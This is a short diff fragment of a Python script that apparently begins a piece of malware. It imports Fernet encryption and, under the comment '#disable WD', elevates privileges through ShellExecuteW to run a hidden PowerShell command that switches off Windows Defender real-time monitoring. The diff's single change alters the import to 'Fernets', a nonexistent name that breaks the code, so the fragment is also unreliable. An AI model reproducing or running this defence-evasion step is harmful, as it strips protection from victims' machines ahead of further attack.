@@ -1,7 +1,7 @@
 import os
 import base64
 import ctypes
-from cryptography.fernet import Fernet
+from cryptography.fernet import Fernets
 
 #disable WD
 ctypes.windll.shell32.ShellExecuteW(None, "runas", "powershell", "Set-MpPreference -DisableRealtimeMonitoring $true", None, 0)
